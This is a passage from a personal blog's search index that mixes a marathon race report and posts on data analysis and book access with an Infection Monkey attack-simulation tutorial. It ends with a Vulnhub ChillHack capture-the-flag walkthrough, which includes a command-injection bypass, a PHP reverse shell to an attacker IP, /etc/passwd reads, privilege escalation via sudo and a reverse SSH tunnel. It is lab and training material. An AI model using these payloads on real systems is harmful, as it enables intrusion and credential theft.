noite anterior a prova, assim não conseguiria nem buscar o kit. Não consegui trocar o voo porque eu havia utilizado minhas milhas, assim tive que procurar todas as alternativas possíveis.
A única alternativa viável e que não me forçaria a comprar um outro voo foi entrar em contato com a organização para saber se um terceiro poderia retirar o meu kit, que para minha felicidade era possível, agora eu só precisava encontrar alguém para retirar para mim. Conversando com meu treinador, ele me disse que conhecia uma pessoa que iria correr também em BsAs e que iria ver a possibilidade de ela me fazer este favor, que atendeu prontamente! Heloísa muito obrigado pela ajuda!
Reservei um hotel próximo da largada, não o suficiente para ir a pé, mas acaba sendo mais rápido para chegar de taxi ou Uber, e é claro, mais barato.
Chegada e pré-prova &nbsp; Cheguei as 19h30 em Buenos Aires, passei mais de 1 hora no aeroporto para conseguir retirar um chip com dados de celular, depois fui para meu hotel e fiz check in, deixei minhas coisas e fui no hotel da Heloisa para retir meu kit, com o kit em mãos, isso já lá pelas 22hs fui procurar um supermercado para comprar as coisas para o café, e assim as coisas começaram a dar errado….
Não encontrei mais nada aberto, apenas os kioskos que são pequenos mercadinhos que vendem salgadinhos, refrigerantes biscoitos e qualquer porcaria para comer rapidamente. Comprei um achocolatado e um lanche frio feito de pão, queijo e presunto. Foi a coisa mais saudável e que poderia me sustentar. A adaptação em si não foi meu problema, mas corroborou.
No jantar, logo depois de comprar meu “café da manhã”, exagerei um pouco e comi algo gorduroso. Novamente fica a dica de você conhecer seu organismo, você o que te faz mal ou não. A gordura da carne e da batata frita me arrebentou, acordei já tendo que ir ao banheiro se passar rei sentado no trono da vergonha, e isso foi até 1h antes da largada, ou seja, das 4h30 até as 6hs.
E o estomago não estava bem…
Após o grave incidente, me arrumei rapidinho, comi e peguei o Uber, cheguei um pouco em cima da hora mas consegui deixar minhas coisas no porta volume, fazer meu xixi e largar!
A corrida &nbsp; Apesar dos mortos e feridos lá estava eu! A correria foi tanta que nem tive tempo para refletir sobre tudo o que se passou nos últimos meses, eu já estava correndo e seguindo o planejamento construído através das semanas.
Mas como eu disse anteriormente, o estômago não estava legal…
Com dificuldade fui me hidratando, estava enjoado mas precisava me recuperar da desidratação da madrugada.
No km 21 começou a briga com o corpo, que não respondia direito os efeitos da diarreia começaram a fazer efeito. Automaticamente meu ritmo caiu de uma hora para outra, quase tudo o que engolia queria voltar. Assim foram mais 21 quilômetros angustia, trotando e se controlando para não vomitar.
Lá pelo km 36 começou a luta pela sobrevivência, trotando em busca da tão sonhada conquista. Só segui por que comecei a ver tanta gente jogada no chão e tantas outras em pior situação que eu seguindo que eu não poderia parar, e tinha tanta gente motivando no final do percurso que comecei a ficar emocionado, mas não poderia chorar, senão vomitaria também. rsrsrs
KM 40 – Segui forte, não ouvia o barulho das pessoas apenas o rosto delas gritando para nós, queria vomitar.
KM 41 – Comecei a ouvir as pessoas berrando, me deu mais força, a energia é demais!
KM 41,5 – O barulho aumentou e os pais que estavam finalizando a prova passaram a ter a companhia dos seus filhos nos ultimos 500mts. Fiquei emocionado, queria ter os meus para fazer o mesmo.
KM 42,195 – Passei o pórtico com a sensação de vencedor, que eu posso qualquer coisa! Não chorei para não vomitar!
Aqui eu poderia escrever um monte de coisas sobre passar a linha de chegada, mas toda a minha vitória foi lá atrás, depois do km 21. Graças a Deus não passei mal ao ponto de perder a consciência, mas percebi claramente que meu corpo não respondia mais e tive que ter a cabeça boa levar este corpanzil até o fim e inteiro.
Alguns dados sobre a prova &nbsp; No masculino, o Quênia como sempre dominando tudo, e completando o pódio com um peruano e o melhor brasileiro chegou em décimo. No feminino, a mesma coisa com o pódio completado pela Etiópia e a melhor brasileira em décimo sexto.
Masculino 1 – Kipkemboi Saina Emmanuel – 2:05:20 2 – Kiptum Barnabas – 2:09:18 3 – Pacheco Cristhian – 2:11:18 10 – Das Neves Silva Valdison – 2:19:47
Feminino 1- Jerono Kiplagat Vivian – 2:29:03 2 – Jerotich Leah – 2:32:57 3 – Bosho Amelework Fikad – 2:34:56 16 – Marques Laura – 2:59:46
Foram 7368 concluintes no total!
Lições aprendidas &nbsp; Planejamento – Retirada de kit, alimentação e descanso Prepare bem sua chegada à cidade da prova, seja ela em seu país ou no exterior. Nunca chegue em cima da hora sem tempo suficiente para se organizar adequadamente. Busque se kit se possível no primeiro dia disponível; Vá ao mercado e compre o café da manhã que costuma se alimentar em suas corridas longas; Faça sua refeição na noite anterior sem exageros. Você conhece seu corpo, você o que pode te fazer mal ou não; Durma cedo e controle sua ansiedade. Este foi meu testemunho sobre debutar na maratona. E a sua estréia como foi?
Tiago
Maratonista. 4747º colocado na maratona de Buenos Aires de 2018 completado em 4h25m44s. 🙂`}).add({id:3,tag:"en",href:"/tags/acm.org/",title:"Acm.org",description:"",content:""}).add({id:4,tag:"en",href:"/blog/portoalegre2018analysis/",title:"Análise dos dados da Maratona de Porto Alegre 2019",description:"Análise de dados dos participantes da Maratona de Porto Alegre 2019, usando Python, Pandas, Matplotlib e Seaborb. ",content:`Após alguns dias estudando e fuçando nas bibliotecas Pandas, Matplotlib e Seaborn, fica fácil analisar uma boa quantidade de informação a partir de uma grande massa de dados. Segue uma análise dos dados da Maratona de Porto Alegre de 2019, na qual tive a felicidade de participar. 🏃🏅
Link para o notebook está disponível em https://github.com/0xtiago/RunningDataAnalytics/tree/master/MaratonaDePoA2019.
Aqui podemos ver nitidamente que os homens dominam em quantidade de finalistas e também costumam ser mais rápidos, em média.
Quantidade de participantes por idade Participantes por idade e gênero Distribuição de finalistas por faixa etária Distribuição de tempo liquido por grupos de idade Equipes com mais participantes`}).add({id:5,tag:"en",href:"/projects/another-project/",title:"Another project",description:"Another project.",content:"Vivamus iaculis metus sed magna porta tincidunt. Aliquam molestie eget orci eu elementum. Integer pellentesque dolor sit amet suscipit maximus. Duis consequat, massa vitae volutpat rhoncus, erat augue venenatis velit, a auctor leo nulla nec turpis. Nunc ut libero sapien. Vivamus aliquam ultrices vestibulum. Sed sit amet vestibulum dolor, ut vehicula diam. Sed felis purus, feugiat vitae vulputate quis, sodales vitae dui. Pellentesque volutpat fringilla sapien varius condimentum. Integer odio massa, pharetra at bibendum vitae, aliquam nec erat."}).add({id:6,tag:"en",href:"/tags/ant+/",title:"Ant+",description:"",content:""}).add({id:7,tag:"en",href:"/tags/apache/",title:"Apache",description:"",content:""}).add({id:8,tag:"en",href:"/tags/application/",title:"Application",description:"",content:""}).add({id:9,tag:"en",href:"/tags/application-security/",title:"Application Security",description:"",content:""}).add({id:10,tag:"en",href:"/tags/appsec/",title:"Appsec",description:"",content:""}).add({id:11,tag:"en",href:"/tags/argentina/",title:"Argentina",description:"",content:""}).add({id:12,tag:"en",href:"/blog/acm_oreillysafari/",title:"Association for Computing Machinery + O'Reilly Safari",description:"Obtendo acesso a um dos maiores acervos técnicos pagando bem pouco por isso!",content:`📚 DICA IMPORTANTE PARA LEITORES E ESTUDANTES!!!
Para aqueles que gastam centenas de reais em livros técnicos todos os anos, sugiro fortemente que se associem ao &ldquo;Association for Computing Machinery&rdquo;. Para quem reside em países de terceiro mundo como nós, podemos nos associar por um preço especial de US$40 anual, e automaticamente você terá acesso irrestrito ao O&rsquo;Reilly Learning, que além dos livros, há diversas video-aulas e possuí aplicativo para ler no celular ou tablet. As principais editoras de livros técnicos tem seus livros publicados nesta plataforma.
Podem confiar! Se tiverem dúvidas, acessem o site da O&rsquo;Reilly Learning e se cadastrem para testar por 10 dias.
Para fazer parte da Association for Computing Machinery: https://www.acm.org/membership/join
Para acessar todo o material do Safari já como membro da ACM ou testar por 10 dias gratuitamente: https://learning.oreilly.com/register/`}).add({id:13,tag:"en",href:"/tags/awareness/",title:"Awareness",description:"",content:""}).add({id:14,tag:"en",href:"/tags/blackhat/",title:"Blackhat",description:"",content:""}).add({id:15,tag:"en",href:"/blog/",title:"Blogs",description:"",content:""}).add({id:16,tag:"en",href:"/tags/books/",title:"Books",description:"",content:""}).add({id:17,tag:"en",href:"/tags/breach-and-attack-simulation/",title:"Breach and Attack Simulation",description:"",content:""}).add({id:18,tag:"en",href:"/blog/infection_monkey/",title:"Breach and Attack Simulation com Infection Monkey 🐵",description:"Realize simulações de ataque em um clique! ",content:`Sumário &nbsp; Sumário Sobre o Infection Monkey 🐵 Como funciona? O que a ferramenta agrega a minha organização? Quais são os ambientes suportados? Setup do laboratório Procedimento de instalação Configuração e execução dos ataques Mais sobre configurações Relatórios Conclusão 🤔 Sobre o Infection Monkey 🐵 &nbsp; O Infection Monkey é uma ferramenta open source mantida pela Guardicore criada para realizar atividades de simulação de ataques e violação de políticas de segurança (BAS - Breach and Attack Simulation). Seu objetivo é testar a resiliência de ambientes em redes privadas e nuvens públicas em um cenário pós-exploratório (onde o atacante já está em seu ambiente), com tentativas de violação de políticas de segurança, movimentação lateral e controle total de ambientes, seja ele Windows ou Linux.
Tudo o que é necessário para baixar e configurar o Infection Monkey se encontra em https://www.guardicore.com/infectionmonkey/.
Como funciona? &nbsp; Ao realizar o deploy de uma instância do Infection Monkey, ele automaticamente realizará um discovery de todo o ambiente que ele possa alcançar e avaliará os riscos de segurança com testes para diferentes cenários, como roubo de credenciais, comprometimento de desktops e domínio, além de outras falhas de segurança. É sugerido que realize esta avaliação periodicamente, assim é possível descobrir falhas após alterações na rede.
Domínio perifa.corp - Infection Monkey Além de ser bem intuitivo, a solução produz relatórios detalhados com todas as instruções de correção e mapas visuais dos pontos de exploração, de forma que você conseguirá visualizar como sua rede está distribuída.
O que a ferramenta agrega a minha organização? &nbsp; Para os CISOs, a ferramenta provê resultados quantitativos sobre a exposição aos riscos que podem ajudar na justificativa de investimentos em segurança.
Para os analistas, os resultados demonstra os pontos frágeis em sua rede, ajudando a priorizar a mitigação destes riscos.
Quais são os ambientes suportados? &nbsp; O Infection Monkey é bem flexível em relação aos ambientes que ele pode ser disponibilizado.
VMware AWS Google Cloud Platform GCP Windows Debian Linux Docker Setup do laboratório &nbsp; O meu laboratório segue as seguintes características para ajudar na demonstração do que a ferramenta é capaz:
Todos os componentes estão na mesma VLAN; Todos os sistemas operacionais estão atualizados; A ferramenta foi configurada para conseguir com sucesso com brute force uma credencial com acesso privilegiado. &nbsp; Como pode ver optei por deixar uma brecha (credencial) para observar ao máximo a ferramenta. Os componentes do laboratórios são os seguintes?
Nome Função IP DC01.perifa.corp (Windows Server 2016) Domain Controler 192.168.210.101 DC02.perifa.corp (Windows Server 2016) Domain Controler 192.168.210.102 WKS01.perifa.corp (Windows 10) Workstation 192.168.210.10 WKS02.perifa.corp (Windows 10) Workstation 192.168.210.11 monkey1.perifa.corp (Debian 10) Infection Monkey 192.168.210.99 O ambiente todo foi construído em VMware Workstation.
Procedimento de instalação &nbsp; Na máquina monkey1 já instalada, configurada e atualizada, vamos começar a instalar as dependências iniciais e ferramentas que iremos utilizar no futuro.
sudo apt install libcurl4 build-essential vim git net-toolsGosto de cores no meu terminal, então se preferir você pode configurar o seu também. =)
$ sudo vim /etc/bash.bashrc ... export LS_OPTIONS=&#39;--color=auto&#39; eval &#34;\`dircolors\`&#34; alias ls=&#39;ls $LS_OPTIONS&#39;Solicite o link de download em https://www.guardicore.com/infectionmonkey/. Após o o recebimento do link, realize o download.
Descompacte o TAR.GZ.
$ tar xvzf monkey-island-debian.tar.gz README.md monkey_island_deb.debInstale o pacote .DEB, se aparecer alguns erros fique tranquilo@
$ sudo dpkg -i monkey_island_deb.deb Use o comando APT para instalar todas as dependências e posteriormente o pacote monkey_island_deb.deb
$ sudo apt install -fO Infection Monkey será instalado e configurado em /var/monkey. Serão instalados dois serviços, o monkey-island (Aplicação) e o monkey-mongo (Bando de Dados.)
Abaixo a estrutura de pastas do serviço.
Vamos verificar se os serviços estão ativos está ativo.
$ sudo systemctl status monkey-* A aplicação receberá requisições HTTP pela porta 5000/tcp. Vamos ver se ela está aberta.
$ sudo netstat -putan | grep 500 ... tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 1926/python tcp 0 0 0.0.0.0:5001 0.0.0.0:* LISTEN 1926/python tcp6 0 0 :::5000 :::* LISTEN 1926/pythonLocalmente, você conseguirá acessar pelo link https://localhost:5000/
Mas remotamente, ainda temos um problema de certificado. =(
Vamos ter que corrigir o certificado. Antes vamos entrar na pasta de certificados do Infection Monkey e fazer um backup dos arquivos atuais
$ cd /var/monkey/monkey_island/cc $ sudo mkdir old_cert $ sudo mv server.crt old_cert/ $ sudo mv server.csr old_cert/ $ sudo mv server.key old_cert/Ainda na pasta /var/monkey/monkey_island/cc , vamos criar um certificado novo.
$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout server.key -out server.crtVocê verá uma saída como a abaixo. Você pode ir digitando ENTER e confirmando tudo.
Generating a RSA private key ............+++++ ......+++++ writing new private key to &#39;server.key&#39; ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter &#39;.&#39;, the field will be left blank. ----- Country Name (2 letter code) [AU]:br State or Province Name (full name) [Some-State]:sp Locality Name (eg, city) []:osasco Organization Name (eg, company) [Internet Widgits Pty Ltd]:Perifa Organizational Unit Name (eg, section) []: Common Name (e.g. server FQDN or YOUR name) []: Email Address []:Reinicie o serviço da aplicação.
$ sudo systemctl restart monkey-islandNão é necessário configurar para que os serviços iniciem automaticamente, na instalação isso já é configurado.
Pronto! Tudo configurado! Agora é possível acessar remotamente.
Configuração e execução dos ataques &nbsp; Agora com o servidor devidamente configurado, agora vem a parte mais fácil, por incrível que pareça.
Logo de inicio você terá duas opções para rodar o Monkey, neste caso vamos combinar o scan realizado pelo servidor e realizar o deploy do client em um dos desktops Windows 10.
Primeiro vamos baixar o cliente no Windows 10.
Você poderá executar o comando gerando em PowerShell no Windows, ou simplesmente baixar o cliente pela URL identificada no comando, https://192.168.210.99:5000/api/monkey/download/monkey-windows-64.exe.
powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $true; (New-Object System.Net.WebClient).DownloadFile(&#39;https://192.168.210.99:5000/api/monkey/download/monkey-windows-64.exe&#39;,&#39;.\\monkey.exe&#39;); ;Start-Process -FilePath &#39;.\\monkey.exe&#39; -ArgumentList &#39;m0nk3y -s 192.168.210.99:5000&#39;;Devido a natureza do software o Windows Defender imediatamente bloqueará o download, você deverá autorizar.
Já no terminal do PowerShell, execute o seguinte comando no diretório onde o cliente foi baixado. Lembrando que a aplicação Monkey Island está no servidor 192.168.210.99.
.\\monkey-windows-64.exe -ArgumentList m0nk3y -s 192.168.210.99:5000 Bootloader starting. Gathering network parameters. Host Name . . . . . . . . . : WKS01 IP Address. . . . . . . . . : 192.168.210.10 IP Address. . . . . . . . . : 172.16.210.138 Windows version: windows8_or_greater Sending request. 192.168.210.99 : (null) : &#34;system&#34;:&#34;windows&#34;, &#34;os_version&#34;:&#34;windows8_or_greater&#34;, &#34;hostname&#34;:&#34;WKS01&#34;, &#34;tunnel&#34;:false, &#34;ips&#34;: [&#34;192.168.210.10&#34;, &#34;172.16.210.138&#34;] Retrieved 17 data bytes: &#34;status&#34;:&#34;RUN&#34; Bootloader finished. Bootloader starting. Gathering network parameters. Host Name . . . . . . . . . : WKS01 IP Address. . . . . . . . . : 192.168.210.10 IP Address. . . . . . . . . : 172.16.210.138 Windows version: windows8_or_greater Sending request. 192.168.210.99 : (null) : &#34;system&#34;:&#34;windows&#34;, &#34;os_version&#34;:&#34;windows8_or_greater&#34;, &#34;hostname&#34;:&#34;WKS01&#34;, &#34;tunnel&#34;:false, &#34;ips&#34;: [&#34;192.168.210.10&#34;, &#34;172.16.210.138&#34;] Retrieved 17 data bytes: &#34;status&#34;:&#34;RUN&#34; Bootloader finished.Pronto! Instantes depois você verá o cliente se comunicando com o servidor.
Ainda na tela Run Monkey, clique em Run on Monkey Island Server.
Agora você verá a interação entre o cliente e server, e a partir de agora os monkeys começarão a vasculhar a rede!
Como dito anteriormente, adicionei nas configurações de bruteforce uma credencial válida para ajudar na demonstração, e no fim tivemos o seguinte cenário, onde todas as máquinas do domínio foram exploradas com sucesso.
Mais sobre configurações &nbsp; Em Configurações é possível realizar ajustes como:
Determinar quais técnicas do MITRE ATT&amp;CK serão utilizadas; Configurar lista de credenciais (usuários e senhas) serão utilizados nos ataques de bruteforce e hashes, se os possuir; Configurações de rede, por exemplo quantidade de saltos permitidos e redes escopo; Execução de scripts customizados (Linux ou Windows) após cada exploração com sucesso; Portas a serem escaneadas nas redes alvo; Quais exploits serão utilizados. Relatórios &nbsp; O Infection Monkey lhe fornecerá os seguinte relatórios. Clique nos links para baixar um exemplo em PDF.
Security Report Zero Trust Report Mais sobre em https://www.guardicore.com/infectionmonkey/zero-trust.html ATT&amp;CK Report Security Report
Zero Trust Report
ATT&amp;CK Report
Conclusão 🤔 &nbsp; O Infection Monkey pode ser um grande aliado em assessments de primeiro nível, realizando todo o trabalho a partir de um botão de START!
Obviamente esta solução jamais irá substituir um trabalho de resiliência completo com profissionais experientes e especialistas nas soluções que compõem o ambiente a ser testado. São esses profissionais que são capazes de &ldquo;tirar coelhos da cartola&rdquo; quando normalmente não se vê qualquer possibilidade de uma escalação de privilégio. 🐇`}).add({id:19,tag:"en",href:"/tags/buenos-aires/",title:"Buenos Aires",description:"",content:""}).add({id:20,tag:"en",href:"/tags/bug-bounty/",title:"Bug Bounty",description:"",content:""}).add({id:21,tag:"en",href:"/tags/cafe-seguro/",title:"Cafe Seguro",description:"",content:""}).add({id:22,tag:"en",href:"/blog/participacao_podcast_cafeseguro/",title:"Café Seguro 23 Café na conta de... Tiago Tavares",description:"Minha participação no podcast Café Seguro, da WSS Security, e apresentado Daniel Dalalana, Pedro Kassick e Ben Hur Ott.",content:`Neste episódio falei um pouco sobre minha carreira, minhas atividades atuais como líder de RedTeam, desafios de estruturação de cultura de AppSec e minha visão sobre melhores práticas e futuro da área.
🔊 Clique AQUI para ouvir.`}).add({id:23,tag:"en",href:"/tags/carreira/",title:"Carreira",description:"",content:""}).add({id:24,tag:"en",href:"/tags/ccsp/",title:"Ccsp",description:"",content:""}).add({id:25,tag:"en",href:"/tags/certifications/",title:"Certifications",description:"",content:""}).add({id:26,tag:"en",href:"/blog/chillhack/",title:"ChillHack: 1 - Vulnhub ",description:"ChillHack: 1 - A Vulnhub vulnerable machine walkthrough.",content:"Table of contents &nbsp; Table of contents 🔎 Enumeration Port scan Reading public available FTP Web discovery Nikto 🚪🚶 Foothold Becoming &ldquo;apaar&rdquo; Reverse SSH Tunnel Web discovery Nikto ffuf 🛡️ Privilege Escalation 🍻 Complete 🔎 Enumeration &nbsp; Port scan &nbsp; root@jiban:/home/tiago# nmap -sT -p- 192.168.0.69 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 15:20 -03 Nmap scan report for 192.168.0.69 Host is up (0.0072s latency). Not shown: 65532 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http MAC Address: 00:0C:29:AE:7E:F9 (VMware)root@jiban:/home/tiago# nmap -sT -p- 192.168.0.69 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 15:20 -03 Nmap scan report for 192.168.0.69 Host is up (0.0072s latency). Not shown: 65532 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http MAC Address: 00:0C:29:AE:7E:F9 (VMware) Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds root@jiban:/home/tiago# nmap -sV -A -O 192.168.0.69 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 15:20 -03 Nmap scan report for 192.168.0.69 Host is up (0.0013s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 1001 1001 90 Oct 03 04:33 note.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.0.24 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA) | 256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA) |_ 256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Game Info MAC Address: 00:0C:29:AE:7E:F9 (VMware) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=12/18%OT=21%CT=1%CU=40368%PV=Y%DS=1%DC=D%G=Y%M=000C29% OS:TM=5FDCF313%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II= OS:I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7% OS:O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W OS:6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S= OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0 OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1 OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI OS:=N%T=40%CD=S) Network Distance: 1 hop Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 1.30 ms 192.168.0.69 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.58 seconds Reading public available FTP &nbsp; root@jiban:/home/tiago# lftp 192.168.0.69 lftp 192.168.0.69:~&gt; ls -rw-r--r-- 1 1001 1001 90 Oct 03 04:33 note.txt lftp 192.168.0.69:/&gt; cat note.txt Anurodh told me that there is some filtering on strings being put in the command -- Apaar 90 bytes transferred lftp 192.168.0.69:/&gt; Web discovery &nbsp; Nikto &nbsp; # nikto -h 192.168.0.69 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.0.69 + Target Hostname: 192.168.0.69 + Target Port: 80 + Start Time: 2020-12-18 15:25:09 (GMT-3) --------------------------------------------------------------------------- + Server: Apache/2.4.29 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs) + IP address found in the &#39;location&#39; header. The IP is &#34;127.0.1.1&#34;. + OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &#34;127.0.1.1&#34;. + Server may leak inodes via ETags, header found with file /, inode: 8970, size: 56d7e303a7e80, mtime: gzip + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Allowed HTTP Methods: POST, OPTIONS, HEAD, GET + OSVDB-3268: /css/: Directory indexing found. + OSVDB-3092: /css/: This might be interesting... + OSVDB-3092: /secret/: This might be interesting... + OSVDB-3268: /images/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + 7915 requests: 0 error(s) and 13 item(s) reported on remote host + End Time: 2020-12-18 15:26:17 (GMT-3) (68 seconds) 🚪🚶 Foothold &nbsp; Although the filter, it was easy to bypass.\nid;cat /etc/passwd id;php -r &#39;$sock=fsockopen(&#34;192.168.0.64&#34;,1234);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39; Spawning a better shell\npython3.6 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;Looking for users in the server\nwww-data@ubuntu:/var/www/html$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false apaar:x:1001:1001:,,,:/home/apaar:/bin/bash anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin www-data@ubuntu:/var/www/html$ Becoming &ldquo;apaar&rdquo; &nbsp; cd /tmp wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t www-data@ubuntu:/tmp$ sudo -l sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh$ sudo -u apaar /home/apaar/.helpline.sh USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww\nReverse SSH Tunnel &nbsp; Verifying open ports internally.\nThere is an open port 9001 available just locally.\n$ netstat -putan To resolve this issue, I needed to take advantage of a reverse shell tunnel, where I set up the localport 9001 to remote computer (My Desktop) in port 9001 as well.\nssh -R 9001:localhost:9001 tiago@192.168.0.64 Web discovery &nbsp; Nikto &nbsp; ┌──(root💀kali)-[/home/tiago] └─# nikto -h http://localhost:9001 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 127.0.0.1 + Target Hostname: localhost + Target Port: 9001 + Message: Multiple IP addresses found: 127.0.0.1, 127.0.0.1 + Start Time: 2020-12-18 21:42:32 (GMT-3) --------------------------------------------------------------------------- + Server: Apache/2.4.29 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs) + IP address found in the &#39;location&#39; header. The IP is &#34;127.0.1.1&#34;. + OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &#34;127.0.1.1&#34;. + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + OSVDB-561: /server-status: This reveals Apache information. Comment out appropriate line in the Apache conf file or restrict access to allowed sources. + OSVDB-3268: /images/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + 7683 requests: 0 error(s) and 10 item(s) reported on remote host + End Time: 2020-12-18 21:43:56 (GMT-3) (84 seconds) --------------------------------------------------------------------------- + 1 host(s) tested ffuf &nbsp; # ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://localhost:9001/FUZZ Fuzz files with extension .php\n┌──(root💀kali)-[/home/tiago/apps/tools/ffuf_1.1.0_linux_amd64] └─# ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://localhost:9001/FUZZ.php /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ 